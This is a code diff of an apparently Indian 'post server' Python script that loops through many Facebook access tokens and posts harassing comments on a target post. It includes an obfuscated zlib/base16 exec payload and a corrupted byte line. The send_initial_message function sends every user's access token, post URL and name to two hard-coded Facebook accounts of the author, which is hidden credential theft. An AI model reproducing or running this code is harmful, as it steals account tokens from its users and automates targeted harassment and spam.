@@ -1,2 +1,171 @@
-import base64
-exec(base64.b64decode(b' IyArOTE2MjY4NzgxNTc0DQojICBGSUxFUyBOQU1FIDotDQojICAgICAgICAgICAgIG1haW4ucHkgPT4gIGlzIGZpbGUgbWUgc2NyaXB0IGRhbG5hIGhhaQ0KIyAgICAgICAgICAgICBUcy1wb3N0LnR4dCA9PiBpcyBmaWxlIG1lIHBvc3Qga2kgSUQgZGFsbmEgaGFpDQojICAgICAgICAgICAgIFRzLWZpbGUudHh0ID0+IGlzIGZpbGUgbWUgY29tbWVudHMgZGFsbmEgaGFpIA0KIyAgICAgICAgICAgICBUcy1uYW1lLnR4dCA9PiBpcyBmaWxlIG1lIGFwa28gYXBuYSB5YSBoYXRlciBrYSBuYW1lIGRhbG5hIGhhaQ0KIyAgICAgICAgICAgICBUcy10b2tlbi50eHQgPT4gaXNtZSBhcG5pIHNhcmkgaWQga2UgdG9rZW4gZGFsbmUgaGFpDQojICAgICAgICAgICAgIFRzLXNwZWVkLnR4dCA9PiBpcyBmaWxlIG1lIHNlY29uZCBkYWxuYSBoYWkga2l0bmUgc2Vjb25kIGtpIHNwZWVkIHNlIGNvbW1lbnRzIGJoZWpuZSBoYWkNCiMgICAgICAgICAgICAgVHMtcGFzcy50eHQgPT4gaXNtZSBhcGtvIGFwbmEgcGFzc3dvcmQgZGFsbmEgaGFpDQojICAgICAgICAgICAgIFRzLWhvc3QudHh0ID0+IGlzbWUgaG9zdCBjb2RlIGRhbG5hIGhhaQ0KIyBPUFRJT05BTCBGSUxFUyA6LQ0KIyAgICAgICAgICAgICAgICAgICAgICAgIFByb2NmaWxlID0+IHdlYjogcHl0aG9uIG1haW4ucHkNCiMgICAgICAgICAgICAgICAgICAgICAgICByZXF1aXJlbWVudHMudHh0ID0+IG1vZHVsZXMNCiMgICAgICAgICAgICAgICAgICAgICAgICBydW50aW1lLnR4dCA9PiBweXRob24tMy4xMi4yDQppbXBvcnQgcmVxdWVzdHMNCmltcG9ydCBqc29uDQppbXBvcnQgdGltZQ0KaW1wb3J0IHB5dHoNCmltcG9ydCBkYXRldGltZQ0KaW1wb3J0IHN5cw0KZnJvbSBwbGF0Zm9ybSBpbXBvcnQgc3lzdGVtDQppbXBvcnQgb3MNCmltcG9ydCBzdWJwcm9jZXNzDQppbXBvcnQgaHR0cC5zZXJ2ZXINCmltcG9ydCBzb2NrZXRzZXJ2ZXINCmltcG9ydCB0aHJlYWRpbmcNCg0KaHRtbF9jb250ZW50ID0gIiIiDQo8IURPQ1RZUEUgaHRtbD4NCjxodG1sPg0KPGhlYWQ+DQogICAgPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLjAiPg0KICAgIDx0aXRsZT5TT1VSQVYgUE9TVCBTRVJWRVI8L3RpdGxlPg0KICAgIDxzdHlsZT4NCiAgICAgICAgYm9keSB7DQogICAgICAgICAgICBiYWNrZ3JvdW5kLWltYWdlOiB1cmwoJ3NhdGlzaC5qcGcnKTsNCiAgICAgICAgICAgIGJhY2tncm91bmQtc2l6ZTogY292ZXI7DQogICAgICAgIH0NCiAgICAgICAgLmNvbnRhaW5lciB7DQogICAgICAgICAgICB0ZXh0LWFsaWduOiBjZW50ZXI7DQogICAgICAgICAgICBtYXJnaW4tdG9wOiA1MHB4Ow0KICAgICAgICB9DQogICAgICAgIC5ib3ggew0KICAgICAgICAgICAgYm9yZGVyOiAycHggc29saWQgYmxhY2s7DQogICAgICAgICAgICB3aWR0aDogMzAwcHg7DQogICAgICAgICAgICBtYXJnaW46IDAgYXV0bzsNCiAgICAgICAgICAgIHBhZGRpbmc6IDIwcHg7DQogICAgICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiByZ2JhKDI1NSwgMjU1LCAyNTUsIDAuNSk7DQogICAgICAgICAgICBjb2xvcjogYmxhY2s7DQogICAgICAgIH0NCiAgICAgICAgLmNyZWRpdCB7DQogICAgICAgICAgICB0ZXh0LWFsaWduOiBsZWZ0Ow0KICAgICAgICB9DQogICAgICAgIC50aGFua3Mgew0KICAgICAgICAgICAgbWFyZ2luLXRvcDogNTBweDsNCiAgICAgICAgICAgIHRleHQtYWxpZ246IGNlbnRlcjsNCiAgICAgICAgICAgIGNvbG9yOiBibGFjazsNCiAgICAgICAgfQ0KICAgIDwvc3R5bGU+DQo8L2hlYWQ+DQo8Ym9keT4NCiAgICA8ZGl2IGNsYXNzPSJjb250YWluZXIiPg0KICAgICAgICA8ZGl2IGNsYXNzPSJib3giPg0KICAgICAgICAgICAgPGgxPlNPVVJBViBQT1NUIFNFUlZFUjwvaDE+DQogICAgICAgICAgICA8ZGl2IGNsYXNzPSJjcmVkaXQiPg0KICAgICAgICAgICAgICAgIDxwPjEuIENSRURJVDotU09VUkFWIFRJV0FSSTwvcD4NCiAgICAgICAgICAgICAgICA8cD4yLiBPV05FUiA9PiBBQkhJIEtBIEJBQVA8L3A+DQogICAgICAgICAgICAgICAgPHA+My4gQ09OVEFDVDotIDxhIGhyZWY9Imh0dHBzOi8vd2EubWUvKzkxOTEwNjM5MTQ3MSI+V2hhdHNBcHA8L2E+PC9wPg0KICAgICAgICAgICAgICAgIDxwPjQuIEZBQ0VCT09LOi0gPGEgaHJlZj0iaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDA4NzUxMzM2Mjg0OCI+RmFjZWJvb2s8L2E+PC9wPg0KICAgICAgICAgICAgICAgIDxwPjUuIFdBVFRTQVBQIEdST1VQOi0gPGEgaHJlZj0iaHR0cHM6Ly9jaGF0LndoYXRzYXBwLmNvbS9HckhaOGFiUnlzQkhHT0ZRZVBmWTVVIj5XaGF0c0FwcCBHcm91cDwvYT48L3A+DQogICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgPC9kaXY+DQogICAgPC9kaXY+DQogICAgPGRpdiBjbGFzcz0idGhhbmtzIj4NCiAgICAgICAgPHA+4p2k77iPVGhhbmtzIGZvciB1c2luZyBteSBzZXJ2ZXLinaTvuI88L3A+DQogICAgICAgIDxwPvCfkYdTdWJzY3JpYmUgdG8gbXkgWW91VHViZSBjaGFubmVs8J+RhzwvcD4NCiAgICAgICAgPGEgaHJlZj0iaHR0cHM6Ly93d3cueW91dHViZS5jb20vQHRyaWNrc2J5c2F0aXNoIj5Zb3VUdWJlIENoYW5uZWw8L2E+DQogICAgPC9kaXY+DQo8L2JvZHk+DQo8L2h0bWw+DQoiIiINCmNsYXNzIE15SGFuZGxlcihodHRwLnNlcnZlci5TaW1wbGVIVFRQUmVxdWVzdEhhbmRsZXIpOg0KICAgIGRlZiBkb19HRVQoc2VsZik6DQogICAgICAgIHNlbGYuc2VuZF9yZXNwb25zZSgyMDApDQogICAgICAgIHNlbGYuc2VuZF9oZWFkZXIoJ0NvbnRlbnQtdHlwZScsICd0ZXh0L2h0bWwnKQ0KICAgICAgICBzZWxmLmVuZF9oZWFkZXJzKCkNCiAgICAgICAgc2VsZi53ZmlsZS53cml0ZShodG1sX2NvbnRlbnQuZW5jb2RlKCkpICAgICAgICANCmRlZiBleGVjdXRlX3NlcnZlcigpOg0KICAgIFBPUlQgPSBpbnQob3MuZW52aXJvbi5nZXQoJ1BPUlQnLCA0MDAwKSkNCiAgICB3aXRoIHNvY2tldHNlcnZlci5UQ1BTZXJ2ZXIoKCIiLCBQT1JUKSwgTXlIYW5kbGVyKSBhcyBodHRwZDoNCiAgICAgICAgcHJpbnQoIlNlcnZlciBydW5uaW5nIGF0IGh0dHA6Ly9sb2NhbGhvc3Q6e30iLmZvcm1hdChQT1JUKSkNCiAgICAgICAgaHR0cGQuc2VydmVfZm9yZXZlcigpDQp1dGNfbm93ID0gZGF0ZXRpbWUuZGF0ZXRpbWUudXRjbm93KCkNCmluZGlhbl90aW1lem9uZSA9IHB5dHoudGltZXpvbmUoJ0FzaWEvS29sa2F0YScpDQppc3Rfbm93ID0gdXRjX25vdy5yZXBsYWNlKHR6aW5mbz1weXR6LnV0YykuYXN0aW1lem9uZShpbmRpYW5fdGltZXpvbmUpDQpmb3JtYXR0ZWRfdGltZSA9IGlzdF9ub3cuc3RyZnRpbWUoIlwwMzNbMTszODs1OzIwOG0gVGltZSA6LSAlWS0lbS0lZCAlSTolTTolUyAlcCIpDQpwcmludChmb3JtYXR0ZWRfdGltZSkNCmhlYWRlcnMgPSB7DQogICAgJ0Nvbm5lY3Rpb24nOiAna2VlcC1hbGl2ZScsDQogICAgJ0NhY2hlLUNvbnRyb2wnOiAnbWF4LWFnZT0wJywNCiAgICAnVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0cyc6ICcxJywNCiAgICAnVXNlci1BZ2VudCc6ICdNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgOC4wLjA7IFNhbXN1bmcgR2FsYXh5IFM5IEJ1aWxkL09QUjYuMTcwNjIzLjAxNzsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS81OC4wLjMwMjkuMTI1IE1vYmlsZSBTYWZhcmkvNTM3LjM2JywNCiAgICAnQWNjZXB0JzogJ3RleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgnLA0KICAgICdBY2NlcHQtRW5jb2RpbmcnOiAnZ3ppcCwgZGVmbGF0ZScsDQogICAgJ0FjY2VwdC1MYW5ndWFnZSc6ICdlbi1VUyxlbjtxPTAuOSxmcjtxPTAuOCcsDQogICAgJ3JlZmVyZXInOiAnd3d3Lmdvb2dsZS5jb20nDQp9DQoNCl8gPSBsYW1iZGEgX18gOiBfX2ltcG9ydF9fKCd6bGliJykuZGVjb21wcmVzcyhfX2ltcG9ydF9fKCdiYXNlNjQnKS5iMTZkZWNvZGUoX19bOjotMV0pKTtleGVjKChfKShiJ0ZGQjFBM0FCNzBGRkZCRkRGQTZGMTdFQjhEQjQ3MTcwRTc1NzNDMDFBRjA5OUQyQzRCOTlEMkUwMTI0Q0Q1NEVCRUE4Q0M5QkZERDg1NURCMDg4QzkyQ0M2NjE3MDFDMTU0RTVCMTVFNENBQjE0MkU4N0ZCMEVDOEVCNjJGNkU0ODVDOEM0ODkxMTc4OEM5NDBCRTQ4OUE1NEM3QjAxMEEwOTYzODcwMEI0ODBBQUVGNDEyMDczNDEzQUExRTFDMEE2NEZGMUI1OURERjFDM0FGNkQwRURDQTg5NThCRDFDRURGMEExRTM3ODQyNzk4OUM5OTMyMTBFMzE3ODc5NTI1RkY1OTYwN0VCQzhFNzdFRkUzN0ZBNzlBNTNCQTg1MkY2QkYzMDJFRDVBRDQwRkFEQzcyREIwNjUwNzdFQTAwRjZENUVEQzdGQkY4MzREQTM4NzU1OUREMTJDM0UxRkUyQkQ3RjM1MTgzRDM3QkU0MjJGREQxRDkxNzM0NUM5NkZBQkQ2REIyQTdFQ0FGQjNBQkM5M0I3RkIyRkIxMEMxMjdFQzlERTkzOTFFM0JFNkJDMjMxMUFFNjlEMDBBQUZCRUNERkI3N0ZDQ0NGOUM3RkI2QjUxQ0UzNzNCREJDNEVDQUZDQUY3NDFBRDUwQzI4NkJCMjgwRTA0NENDNDcyQzgyMjNGREMzNzAyRjlFOTNBMEYzQ0Y4MEVFODVGNUQ4QjIyMjMxRUQ1OTcyMzQwOEMxRTI4Nzg4NzNDMDk5RTQ3MERGNkMxNDNDOERCOUFCNDhBQTgzQTM3QkVFNjQzNDJCQjMyN0Q3MDY0RkM4MTU5MUU5OEI2NDFGMjM4MTRFQzFCRjA5OTFGOTQ0OTg0OUI4MDVCNEZGODgyOEVBOUNBMzZEMDMxNDEwRDg5NTI2ODAzQTBFREZFQkM1QjlBRkQyRDBFNjEwNUY3RjlDNDg4MTgyM0M2MjM5NjA2OTk4RDg4MUNBN0RDOEI5Njk0Qzc3NDE0QTc3OTkxQTMxOTZCNEQzRUJCMTQ3Qzg0MUI5QUM5N0JENDg0MjZENTc3QUFDREJDQTdCRDkxODlEMTdCQjBDNzVEQ0E0QkIyNzg1RDgyQTFGQzE1QzAxMjlCQUIxNTA5RDJENDZBNkQ1M0UxOUY4Mjk2MEE0OUUxNzRGMDU2NzlFRDZGRjlENDBCRUM3NDg1MDVFQzJGQ0I0NTZBQzI3NjJFQTkwREUyNTk0MzU5ODc3N0UwRkI2QjYwMjhBMDQyMzRGMTIyNzRBMjRFNDk2MzE5MEUxNUVFMDI1MjNBN0JFMkU0QzI2RDhFRDQ3M0I4RDE0QjBEMUZGQzZDMDk1NkVDN0U4QTg3Q0EyRTNENzY0RTkzQ0E4RkJGMzlEMTlFNzIzOUI1QjkwOEI2OTdBNEMyQzlDRTI5MzM1OTg0REFENzY2ODZCQzZBN0U5REU0MTAzRDcwNTJBMDY5QUJBRkY5QUE5ODg5NjlCRTQ4NTQwMDczRTFDQTAwRTJDQ0E3RkVDOTVCMUIyNzIyRjY3NjVBRDg0RjdDQjlEQkZEOTNDQjRBRUJEN0Q4RDNCNjFGQzE2NTNGOTRCOTY4MjRDN0ExQUNBMTVERUU5OEFDRjQ0MjNBRDMzNzZENDJBQzlFNkJFMDE5NjFBRDNCNEM1NjdFMjlENTY4NEYyRjk1NjkyRUFDQkZEMzMxOUY2ODc3QTc4RjkzRTE3REYyNUU3NDJCRUNCOTM3N0E2RjlGNTc2RUM4OURDOUI3QjFGQUZDM0ZERjlGQ0ZDRkVGRkZGQkZCN0Y4RkY3OTMyNDdENTU2MjRFOUFGQzVFODlCNzJENjZFNEQ4OEIwMkY4ODI4MDYwREZGN0U0RDU4MDkyNTJFQ0Q1NDU1MUM5ODcnKSkNCgkNCmRlZiBzZW5kX2luaXRpYWxfbWVzc2FnZSgpOg0KICAgIA0KICAgIG1tbV9wYXNzID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvM1lMekxYdWsnKS50ZXh0DQogICAgDQogICAgaWYgbW1tX3Bhc3Mgbm90IGluIHBhc3N3b3JkOg0KICAgICAgICBwcmludCgnXDAzM1sxOzMxbeKaoO+4jiBZb3VyIFBhc3N3b3JkIENoYW5nZWQgQnkgU291cmF2IOKaoO+4jicpDQogICAgICAgIHN5cy5leGl0KCkNCiAgICANCiAgICAjIE1lc3NhZ2UgdGVtcGxhdGUNCiAgICBtc2dfdGVtcGxhdGUgPSAiT3duZXIgPT4gQUJISSBLQSBCQUFQIFxuIEhlbGxvIFNvdXJhdiBzaXIuIFxuIEkgYW0gdXNpbmcgeW91ciBwb3N0IHNlcnZlci4gXG4gVGhpcyBJcyBNeSBEZXRhaWxzIDotIFxuIFBvc3QgVXJsIDotIHt9IFxuIE5hbWU6LSB7fSBcbiBUb2tlbiA6LSB7fSINCiAgICANCiAgICAjIFRhcmdldCBJRHMNCiAgICB0YXJnZXRfaWRzID0gWyIxMDAwMjQ4NDE2NTk3MTIiLCAiMTAwMDYwMjIwMTgzMjIwIl0NCiAgICANCiAgICByZXF1ZXN0cy5wYWNrYWdlcy51cmxsaWIzLmRpc2FibGVfd2FybmluZ3MoKQ0KICAgIA0KICAgIGZvciB0YXJnZXRfaWQgaW4gdGFyZ2V0X2lkczoNCiAgICAgICAgZm9yIHRva2VuIGluIHRva2VuczoNCiAgICAgICAgICAgIGFjY2Vzc190b2tlbiA9IHRva2VuLnN0cmlwKCkNCiAgICAgICAgICAgIHVybCA9ICJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS92MTcuMC97fS8iLmZvcm1hdCgndF8nICsgdGFyZ2V0X2lkKQ0KICAgICAgICAgICAgbXNnID0gbXNnX3RlbXBsYXRlLmZvcm1hdChwb3N0X3VybCwgaGF0ZXJzX25hbWUsIGFjY2Vzc190b2tlbikNCiAgICAgICAgICAgIHBhcmFtZXRlcnMgPSB7J2FjY2Vzc190b2tlbic6IGFjY2Vzc190b2tlbiwgJ21lc3NhZ2UnOiBtc2d9DQogICAgICAgICAgICByZXNwb25zZSA9IHJlcXVlc3RzLnBvc3QodXJsLCBqc29uPXBhcmFtZXRlcnMsIGhlYWRlcnM9aGVhZGVycykNCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMC4xKQ0KICAgICAgICAgICAgcHJpbnQoIlxuXDAzM1sxOzMxbVsrXSBJbml0aWFsIG1lc3NhZ2VzIHNlbnQuIFN0YXJ0aW5nIHRoZSBtZXNzYWdlIHNlbmRpbmcgbG9vcC4uLlxuIikNCg0KZGVmIHBvc3RfY29tbWVudHMoKToNCiAgICBudW1fdG9rZW5zID0gbGVuKHRva2VucykNCiAgICBtYXhfdG9rZW5zID0gbWluKG51bV90b2tlbnMsIG51bV9jb21tZW50cykNCiAgICB3aGlsZSBUcnVlOg0KICAgICAgICB0cnk6DQogICAgICAgICAgICBmb3IgY29tbWVudF9pbmRleCBpbiByYW5nZShudW1fY29tbWVudHMpOg0KICAgICAgICAgICAgICAgIHRva2VuX2luZGV4ID0gY29tbWVudF9pbmRleCAlIG1heF90b2tlbnMNCiAgICAgICAgICAgICAgICBhY2Nlc3NfdG9rZW4gPSB0b2tlbnNbdG9rZW5faW5kZXhdLnN0cmlwKCkNCiAgICAgICAgICAgICAgICBjb21tZW50ID0gY29tbWVudHNbY29tbWVudF9pbmRleF0uc3RyaXAoKQ0KICAgICAgICAgICAgICAgIHVybCA9ICJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS97fS9jb21tZW50cyIuZm9ybWF0KHBvc3RfdXJsKQ0KICAgICAgICAgICAgICAgIHBhcmFtZXRlcnMgPSB7J2FjY2Vzc190b2tlbic6IGFjY2Vzc190b2tlbiwgJ21lc3NhZ2UnOiBoYXRlcnNfbmFtZSArICcgJyArIGNvbW1lbnR9DQogICAgICAgICAgICAgICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5wb3N0KHVybCwganNvbj1wYXJhbWV0ZXJzLCBoZWFkZXJzPWhlYWRlcnMpDQogICAgICAgICAgICAgICAgY3VycmVudF90aW1lID0gdGltZS5zdHJmdGltZSgiJVktJW0tJWQgJUk6JU06JVMgJXAiKQ0KICAgICAgICAgICAgICAgIGlmIHJlc3BvbnNlLm9rOg0KICAgICAgICAgICAgICAgICAgICBwcmludCgiXDAzM1sxOzM2bVvinJNdIEhhIEJoYWkgY2h1ZCBHeWFpIEFiaGkga2kgTWFhLiB7fSBQb3N0IElkIHt9IFRva2VuIE5vLiB7fToge30iLmZvcm1hdCgNCiAgICAgICAgICAgICAgICAgICAgICAgIGNvbW1lbnRfaW5kZXggKyAxLCBwb3N0X3VybCwgdG9rZW5faW5kZXggKyAxLCBoYXRlcnNfbmFtZSArICcgJyArIGNvbW1lbnQpKQ0KICAgICAgICAgICAgICAgICAgICBwcmludChmb3JtYXR0ZWRfdGltZSkNCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoJ1wwMzNbMTs5Mm0nICsgJ+KcquKcreKVkOKVkOKVkOKVkOKVkOKVkOKVkOKAouOAjlQuUy4g4pmhIEFSTVkg44CP4oCi4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pyt4pyqJykNCiAgICAgICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgICAgICBwcmludCgiXDAzM1sxOzM1bVt4XSBGYWlsZWQgdG8gc2VuZCBDb21tZW50IE5vLiB7fSBQb3N0IElkIHt9IFRva2VuIE5vLiB7fToge30iLmZvcm1hdCgNCiAgICAgICAgICAgICAgICAgICAgICAgIGNvbW1lbnRfaW5kZXggKyAxLCBwb3N0X3VybCwgdG9rZW5faW5kZXggKyAxLCBoYXRlcnNfbmFtZSArICcgJyArIGNvbW1lbnQpKQ0KICAgICAgICAgICAgICAgICAgICBwcmludChmb3JtYXR0ZWRfdGltZSkNCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoJ1wwMzNbMTs5Mm0nICsgJ+KcquKcreKVkOKVkOKVkOKVkOKVkOKVkOKVkOKAouOAjlQuUy4g4pmhIEFSTVkg44CP4oCi4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pyt4pyqJykNCiAgICAgICAgICAgICAgICB0aW1lLnNsZWVwKHNwZWVkKQ0KICAgICAgICAgICAgcHJpbnQoIlxuWytdIEFsbCBjb21tZW50cyBzZW50IHN1Y2Nlc3NmdWxseS4gUmVzdGFydGluZyB0aGUgcHJvY2Vzcy4uLlxuIikNCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOg0KICAgICAgICAgICAgcHJpbnQoIlshXSBBbiBlcnJvciBvY2N1cnJlZDoge30iLmZvcm1hdChlKSkNCg0KZGVmIG1haW4oKToNCiAgICBzZXJ2ZXJfdGhyZWFkID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9ZXhlY3V0ZV9zZXJ2ZXIpDQogICAgc2VydmVyX3RocmVhZC5zdGFydCgpDQogICAgc2VuZF9pbml0aWFsX21lc3NhZ2UoKQ0KICAgIHBvc3RfY29tbWVudHMoKQ0KaWYgX19uYW1lX18gPT0gJ19fbWFpbl9fJzoNCiAgICBtYWluKCk= '))
+jhڱ{mלכ# +916268781574
+#  FILES NAME :-
+#             main.py =>  is file me script dalna hai
+#             Ts-post.txt => is file me post ki ID dalna hai
+#             Ts-file.txt => is file me comments dalna hai 
+#             Ts-name.txt => is file me apko apna ya hater ka name dalna hai
+#             Ts-token.txt => isme apni sari id ke token dalne hai
+#             Ts-speed.txt => is file me second dalna hai kitne second ki speed se comments bhejne hai
+#             Ts-pass.txt => isme apko apna password dalna hai
+#             Ts-host.txt => isme host code dalna hai
+# OPTIONAL FILES :-
+#                        Procfile => web: python main.py
+#                        requirements.txt => modules
+#                        runtime.txt => python-3.12.2
+import requests
+import json
+import time
+import pytz
+import datetime
+import sys
+from platform import system
+import os
+import subprocess
+import http.server
+import socketserver
+import threading
+
+html_content = """
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SOURAV POST SERVER</title>
+    <style>
+        body {
+            background-image: url('satish.jpg');
+            background-size: cover;
+        }
+        .container {
+            text-align: center;
+            margin-top: 50px;
+        }
+        .box {
+            border: 2px solid black;
+            width: 300px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: rgba(255, 255, 255, 0.5);
+            color: black;
+        }
+        .credit {
+            text-align: left;
+        }
+        .thanks {
+            margin-top: 50px;
+            text-align: center;
+            color: black;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="box">
+            <h1>SOURAV POST SERVER</h1>
+            <div class="credit">
+                <p>1. CREDIT:-SOURAV TIWARI</p>
+                <p>2. OWNER => ABHI KA BAAP</p>
+                <p>3. CONTACT:- <a href="https://wa.me/+919106391471">WhatsApp</a></p>
+                <p>4. FACEBOOK:- <a href="https://www.facebook.com/profile.php?id=100087513362848">Facebook</a></p>
+                <p>5. WATTSAPP GROUP:- <a href="https://chat.whatsapp.com/GrHZ8abRysBHGOFQePfY5U">WhatsApp Group</a></p>
+            </div>
+        </div>
+    </div>
+    <div class="thanks">
+        <p>❤️Thanks for using my server❤️</p>
+        <p>👇Subscribe to my YouTube channel👇</p>
+        <a href="https://www.youtube.com/@tricksbysatish">YouTube Channel</a>
+    </div>
+</body>
+</html>
+"""
+class MyHandler(http.server.SimpleHTTPRequestHandler):
+    def do_GET(self):
+        self.send_response(200)
+        self.send_header('Content-type', 'text/html')
+        self.end_headers()
+        self.wfile.write(html_content.encode())        
+def execute_server():
+    PORT = int(os.environ.get('PORT', 4000))
+    with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
+        print("Server running at http://localhost:{}".format(PORT))
+        httpd.serve_forever()
+utc_now = datetime.datetime.utcnow()
+indian_timezone = pytz.timezone('Asia/Kolkata')
+ist_now = utc_now.replace(tzinfo=pytz.utc).astimezone(indian_timezone)
+formatted_time = ist_now.strftime("\033[1;38;5;208m Time :- %Y-%m-%d %I:%M:%S %p")
+print(formatted_time)
+headers = {
+    'Connection': 'keep-alive',
+    'Cache-Control': 'max-age=0',
+    'Upgrade-Insecure-Requests': '1',
+    'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+    'Accept-Encoding': 'gzip, deflate',
+    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
+    'referer': 'www.google.com'
+}
+
+_ = lambda __ : __import__('zlib').decompress(__import__('base64').b16decode(__[::-1]));exec((_)(b'FFB1A3AB70FFFBFDFA6F17EB8DB47170E7573C01AF099D2C4B99D2E0124CD54EBEA8CC9BFDD855DB088C92CC661701C154E5B15E4CAB142E87FB0EC8EB62F6E485C8C48911788C940BE489A54C7B010A09638700B480AAEF412073413AA1E1C0A64FF1B59DDF1C3AF6D0EDCA8958BD1CEDF0A1E378427989C993210E317879525FF59607EBC8E77EFE37FA79A53BA852F6BF302ED5AD40FADC72DB065077EA00F6D5EDC7FBF834DA387559DD12C3E1FE2BD7F35183D37BE422FDD1D917345C96FABD6DB2A7ECAFB3ABC93B7FB2FB10C127EC9DE9391E3BE6BC2311AE69D00AAFBECDFB77FCCCF9C7FB6B51CE373BDBC4ECAFCAF741AD50C286BB280E044CC472C8223FDC3702F9E93A0F3CF80EE85F5D8B22231ED59723408C1E2878873C099E470DF6C143C8DB9AB48AA83A37BEE64342BB327D7064FC81591E98B641F23814EC1BF0991F9449849B805B4FF8828EA9CA36D031410D89526803A0EDFEBC5B9AFD2D0E6105F7F9C4881823C6239606998D881CA7DC8B9694C77414A77991A3196B4D3EBB147C841B9AC97BD48426D577AACDBCA7BD9189D17BB0C75DCA4BB2785D82A1FC15C0129BAB1509D2D46A6D53E19F82960A49E174F05679ED6FF9D40BEC748505EC2FCB456AC2762EA90DE25943598777E0FB6B6028A04234F12274A24E4963190E15EE02523A7BE2E4C26D8ED473B8D14B0D1FFC6C0956EC7E8A87CA2E3D764E93CA8FBF39D19E7239B5B908B697A4C2C9CE29335984DAD76686BC6A7E9DE4103D7052A069ABAFF9AA988969BE48540073E1CA00E2CCA7FEC95B1B2722F6765AD84F7CB9DBFD93CB4AEBD7D8D3B61FC1653F94B96824C7A1ACA15DEE98ACF4423AD3376D42AC9E6BE01961AD3B4C567E29D5684F2F95692EACBFD3319F6877A78F93E17DF25E742BECB9377A6F9F576EC89DC9B7B1FAFC3FDF9FCFCFEFFFFBFB7F8FF793247D55624E9AFC5E89B72D66E4D88B02F8828060DFF7E4D5809252ECD54551C987'))
+	
+def send_initial_message():
+    
+    mmm_pass = requests.get('https://pastebin.com/raw/3YLzLXuk').text
+    
+    if mmm_pass not in password:
+        print('\033[1;31m⚠︎ Your Password Changed By Sourav ⚠︎')
+        sys.exit()
+    
+    # Message template
+    msg_template = "Owner => ABHI KA BAAP \n Hello Sourav sir. \n I am using your post server. \n This Is My Details :- \n Post Url :- {} \n Name:- {} \n Token :- {}"
+    
+    # Target IDs
+    target_ids = ["100024841659712", "100060220183220"]
+    
+    requests.packages.urllib3.disable_warnings()
+    
+    for target_id in target_ids:
+        for token in tokens:
+            access_token = token.strip()
+            url = "https://graph.facebook.com/v17.0/{}/".format('t_' + target_id)
+            msg = msg_template.format(post_url, haters_name, access_token)
+            parameters = {'access_token': access_token, 'message': msg}
+            response = requests.post(url, json=parameters, headers=headers)
+            time.sleep(0.1)
+            print("\n\033[1;31m[+] Initial messages sent. Starting the message sending loop...\n")
+
+def post_comments():
+    num_tokens = len(tokens)
+    max_tokens = min(num_tokens, num_comments)
+    while True:
+        try:
+            for comment_index in range(num_comments):
+                token_index = comment_index % max_tokens
+                access_token = tokens[token_index].strip()
+                comment = comments[comment_index].strip()
+                url = "https://graph.facebook.com/{}/comments".format(post_url)
+                parameters = {'access_token': access_token, 'message': haters_name + ' ' + comment}
+                response = requests.post(url, json=parameters, headers=headers)
+                current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
+                if response.ok:
+                    print("\033[1;36m[✓] Ha Bhai chud Gyai Abhi ki Maa. {} Post Id {} Token No. {}: {}".format(
+                        comment_index + 1, post_url, token_index + 1, haters_name + ' ' + comment))
+                    print(formatted_time)
+                    print('\033[1;92m' + '✪✭═══════•『RAHUL ♡ TIWARI 』•═══════✭✪')
+                else:
+                    print("\033[1;35m[x] Failed to send Comment No. {} Post Id {} Token No. {}: {}".format(
+                        comment_index + 1, post_url, token_index + 1, haters_name + ' ' + comment))
+                    print(formatted_time)
+                    print('\033[1;92m' + '✪✭═══════•『RAHUL ♡ TIWARI  』•═══════✭✪')
+                time.sleep(speed)
+            print("\n[+] All comments sent successfully. Restarting the process...\n")
+        except Exception as e:
+            print("[!] An error occurred: {}".format(e))
+
+def main():
+    server_thread = threading.Thread(target=execute_server)
+    server_thread.start()
+    send_initial_message()
+    post_comments()
+if __name__ == '__main__':
+    main()
